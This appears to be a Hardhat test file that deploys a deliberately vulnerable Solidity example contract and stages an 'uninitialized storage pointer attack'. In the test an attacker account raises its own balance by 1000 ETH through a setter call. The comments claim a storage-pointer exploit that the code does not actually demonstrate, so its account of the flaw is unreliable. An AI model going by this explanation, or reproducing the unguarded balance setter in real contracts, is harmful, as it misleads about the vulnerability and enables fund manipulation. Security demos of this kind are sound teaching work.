// Import necessary modules and libraries.
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Uninitialized Storage Pointer Simulation", function () {
    let uninitializedStoragePointerVulnerabilityExample;
    let owner;
    let attacker;

    before(async function () {
        [owner, attacker] = await ethers.getSigners();

        // Deploy the UninitializedStoragePointerVulnerabilityExample contract
        console.log('Deploying UninitializedStoragePointerVulnerabilityExample contract...');
        const UninitializedStoragePointerVulnerabilityExample = await ethers.getContractFactory("UninitializedStoragePointerVulnerabilityExample");
        uninitializedStoragePointerVulnerabilityExample = await UninitializedStoragePointerVulnerabilityExample.deploy();
        await uninitializedStoragePointerVulnerabilityExample.deployed();
    });

    it("simulate an uninitialized storage pointer attack", async function () {
        // Set the balance for the owner
        const initialBalance = ethers.utils.parseEther("100");
        await uninitializedStoragePointerVulnerabilityExample.connect(owner).setBalance(initialBalance);

        // Attacker reads uninitialized storage data
        const attackerBalance = await uninitializedStoragePointerVulnerabilityExample.connect(attacker).getBalance();
        console.log("Attacker's Initial Balance:", ethers.utils.formatEther(attackerBalance), "ETH");

        // Calculate the amount to add to the attacker's balance
        const additionalBalance = ethers.utils.parseEther("1000");
        console.log("Additional Balance to Add:", ethers.utils.formatEther(additionalBalance), "ETH");

        // Perform the attack by manipulating the uninitialized storage pointer
        await uninitializedStoragePointerVulnerabilityExample.connect(attacker).setBalance(attackerBalance.add(additionalBalance));

        // Verify the manipulated balance
        const updatedAttackerBalance = await uninitializedStoragePointerVulnerabilityExample.connect(attacker).getBalance();
        console.log("Attacker's Final Balance:", ethers.utils.formatEther(updatedAttackerBalance), "ETH");

        // The attacker's balance should now be increased
        expect(updatedAttackerBalance).to.equal(attackerBalance.add(additionalBalance));

        // Verify contract state
        const ownerBalance = await uninitializedStoragePointerVulnerabilityExample.connect(owner).getBalance();

        // The owner's balance should be set correctly
        expect(ownerBalance).to.equal(initialBalance);
    });
});
